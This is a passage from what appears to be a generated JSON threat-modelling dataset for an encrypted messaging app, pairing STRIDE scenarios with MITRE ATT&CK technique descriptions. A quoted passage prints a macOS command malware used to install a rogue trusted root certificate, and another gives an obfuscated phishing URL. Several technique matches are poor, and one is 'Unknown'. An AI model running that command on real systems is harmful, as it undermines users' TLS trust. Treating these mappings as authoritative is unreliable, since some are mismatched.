                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted metadata (such as recipient information or message timestamps) during transmission.",
            "Assumptions": [
                {
                    "Assumption": "The system transmits some metadata in unencrypted form.",
                    "Role": "Application",
                    "Condition": "When metadata encryption is not enforced."
                },
                {
                    "Assumption": "The attacker can perform network sniffing or monitoring.",
                    "Role": "Attacker",
                    "Condition": "When the attacker is on the same network."
                },
                {
                    "Assumption": "Users are unaware that metadata is exposed.",
                    "Role": "End-user",
                    "Condition": "When there is a lack of awareness about metadata sensitivity."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communication details, loss of privacy.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "metadata",
                "information disclosure",
                "network sniffing"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the messaging app to access stored user messages and keys.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities within the application.",
                    "Role": "Application",
                    "Condition": "When the software has known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The attacker can exploit the vulnerabilities remotely.",
                    "Role": "Attacker",
                    "Condition": "If the application is accessible over the internet."
                },
                {
                    "Assumption": "Stored data is not protected by strong encryption.",
                    "Role": "Application",
                    "Condition": "When encryption policies are weak."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive messages and user keys.",
            "MITRE ATT&CK Keywords": [
                "software vulnerability",
                "information disclosure",
                "storage access",
                "remote exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker compromises a user's device and gains access to their private messages and identity keys stored locally.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's malware can bypass existing device security measures.",
                    "Role": "Attacker",
                    "Condition": "When device security is insufficient."
                },
                {
                    "Assumption": "Private keys and messages are stored in an insecure manner.",
                    "Role": "Application",
                    "Condition": "When local storage lacks encryption."
                },
                {
                    "Assumption": "The user does not detect the compromise in a timely manner.",
                    "Role": "End-user",
                    "Condition": "When there is no monitoring of unusual device activity."
                }
            ],
            "Potential Impact": "Compromise of confidential communication data, loss of trust in device security.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "information disclosure",
                "device compromise",
                "local storage access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service (DDoS) attack against the messaging application's server infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's botnet has sufficient capacity to overwhelm the servers.",
                    "Role": "Attacker",
                    "Condition": "When the attacker controls a large botnet."
                },
                {
                    "Assumption": "The application lacks adequate DDoS mitigation mechanisms.",
                    "Role": "Application",
                    "Condition": "If anti-DDoS strategies are not implemented."
                },
                {
                    "Assumption": "Users rely on continuous access to the messaging service.",
                    "Role": "End-user",
                    "Condition": "When service availability is critical."
                }
            ],
            "Potential Impact": "Service disruption, unavailability of messaging platform, loss of communication capabilities.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "denial of service",
                "network",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a resource exhaustion vulnerability in the desktop client to freeze or crash the application.",
            "Assumptions": [
                {
                    "Assumption": "There are known or unknown vulnerabilities in the client software.",
                    "Role": "Application",
                    "Condition": "When the software is not secure against resource exhaustion."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability remotely over the network.",
                    "Role": "Attacker",
                    "Condition": "When the application is vulnerable to remote attacks."
                },
                {
                    "Assumption": "Users rely on desktop clients for their communication needs.",
                    "Role": "End-user",
                    "Condition": "When desktop clients are essential for operations."
                }
            ],
            "Potential Impact": "Application crashes, reduced service availability, loss of productivity.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "denial of service",
                "client",
                "application crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses maliciously crafted messages to exploit software bugs in the application causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The application does not adequately validate incoming message data.",
                    "Role": "Application",
                    "Condition": "When input validation is insufficient."
                },
                {
                    "Assumption": "The attacker knows the message format and can craft malicious messages.",
                    "Role": "Attacker",
                    "Condition": "If the message format is publicly known or reverse-engineered."
                },
                {
                    "Assumption": "Users do not have alternative means of communication.",
                    "Role": "End-user",
                    "Condition": "When the application is the primary communication tool."
                }
            ],
            "Potential Impact": "Application unresponsiveness, service disruption, loss of communication capabilities.",
            "MITRE ATT&CK Keywords": [
                "malicious message",
                "denial of service",
                "input validation",
                "software bug"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability to gain admin rights on the messaging server.",
            "Assumptions": [
                {
                    "Assumption": "The server has vulnerabilities that allow privilege escalation.",
                    "Role": "Application",
                    "Condition": "When system patches and updates are not applied."
                },
                {
                    "Assumption": "The attacker has an initial foothold in the server environment.",
                    "Role": "Attacker",
                    "Condition": "When the attacker can run code on the server."
                },
                {
                    "Assumption": "The server does not have effective privilege separation mechanisms.",
                    "Role": "Application",
                    "Condition": "If privilege boundaries are not enforced."
                }
            ],
            "Potential Impact": "Unauthorized access to server functions and data, potential for further exploitation.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server",
                "elevation of privilege",
                "admin access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to a companion device by exploiting an unpatched vulnerability, allowing full control over the device.",
            "Assumptions": [
                {
                    "Assumption": "The companion device has existing vulnerabilities.",
                    "Role": "Device",
                    "Condition": "If the device software is not regularly updated."
                },
                {
                    "Assumption": "The attacker has the skills and resources to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "When the attacker is knowledgeable and resourceful."
                },
                {
                    "Assumption": "Root access provides unrestricted control over the device.",
                    "Role": "Device",
                    "Condition": "When security mechanisms can be bypassed."
                }
            ],
            "Potential Impact": "Full compromise of device security, unauthorized access to sensitive data, potential for further exploitation.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "elevation of privilege",
                "device vulnerability",
                "full control"
            ],
            "mitre_technique": {
                "name": "SSH Hijacking",
                "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "id": "attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8",
                "technique_id": "T1563.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a software flaw in the encryption protocol implementation to escalate their privileges within the application.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol implementation contains exploitable flaws.",
                    "Role": "Application",
                    "Condition": "When implementation does not follow best practices."
                },
                {
                    "Assumption": "The attacker can interact with the application using the vulnerable protocol.",
                    "Role": "Attacker",
                    "Condition": "If the protocol is exposed to the attacker."
                },
                {
                    "Assumption": "Privilege escalation mechanisms are not sufficiently monitored.",
                    "Role": "Application",
                    "Condition": "When logging and monitoring are inadequate."
                }
            ],
            "Potential Impact": "Escalation from standard user to admin privileges, unauthorized access and control over sensitive operations.",
            "MITRE ATT&CK Keywords": [
                "encryption protocol",
                "elevation of privilege",
                "software flaw",
                "admin privileges"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by creating a fake public/private key pair and distributing the public key as the legitimate user\u2019s key.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can generate a public/private key pair that looks legitimate.",
                    "Role": "Attacker",
                    "Condition": "The application relies on user-distributed keys without a robust trust mechanism."
                },
                {
                    "Assumption": "Users may not verify the authenticity of public keys.",
                    "Role": "User",
                    "Condition": "Users lack knowledge or fail to use secure key verification methods."
                },
                {
                    "Assumption": "The attacker's distribution of the fake public key goes undetected.",
                    "Role": "System",
                    "Condition": "No active monitoring or verification mechanisms are in place."
                }
            ],
            "Potential Impact": "Unauthorized access can lead to message interception and exposure of sensitive content.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user authentication",
                "public key",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
                "technique_id": "T1553.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the user interface of the messaging application, tricking users into revealing their authentication keys.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can create convincing phishing websites or applications.",
                    "Role": "Attacker",
                    "Condition": "Access to tools and skills for creating phishing content."
                },
                {
                    "Assumption": "Users will interact with the fake interface believing it is genuine.",
                    "Role": "User",
                    "Condition": "Users are not cautious or fail to verify URLs and interfaces."
                },
                {
                    "Assumption": "No system-level warning mechanisms alert users of potential phishing attempts.",
                    "Role": "System",
                    "Condition": "Lack of integrated phishing detection and prevention."
                }
            ],
            "Potential Impact": "Confidentiality of authentication keys is compromised, leading to unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "spoofing",
                "credential harvesting",
                "UI impersonation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers use compromised companion devices to impersonate legitimate primary devices in the system.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices have been compromised without detection.",
                    "Role": "Attacker",
                    "Condition": "Attackers have access to companion devices and can manipulate them."
                },
                {
                    "Assumption": "System trusts companion devices authenticated by the primary device.",
                    "Role": "System",
                    "Condition": "Trust is extended without periodic re-verification."
                },
                {
                    "Assumption": "No effective anomaly detection between primary and companion device interactions.",
                    "Role": "System",
                    "Condition": "Lack of continuous monitoring and anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Sensitive data can be accessed or modified by unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "companion device",
                "spoofing",
                "identity theft",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies messages in transit between users.",
            "Assumptions": [
                {
                    "Assumption": "Messages in transit can be intercepted due to weaknesses in network security.",
                    "Role": "Attacker",
                    "Condition": "Lack of secure network configuration or use of insecure communication channels."
                },
                {
                    "Assumption": "Lack of end-to-end message integrity verification.",
                    "Role": "System",
                    "Condition": "System does not implement integrity checks or verification mechanisms."
                },
                {
                    "Assumption": "No alerts or mechanisms detect modifications made to messages.",
                    "Role": "System",
                    "Condition": "Monitoring and tampering detection are insufficient."
                }
            ],
            "Potential Impact": "Integrity of the communication is compromised, leading to misinformation or unauthorized data manipulation.",
            "MITRE ATT&CK Keywords": [
                "message tampering",
                "man-in-the-middle",
                "data integrity",
                "network security"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the SQLite database and modifies stored messages or authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database is insufficiently protected.",
                    "Role": "System",
                    "Condition": "Databases lack encryption or secure access controls."
                },
                {
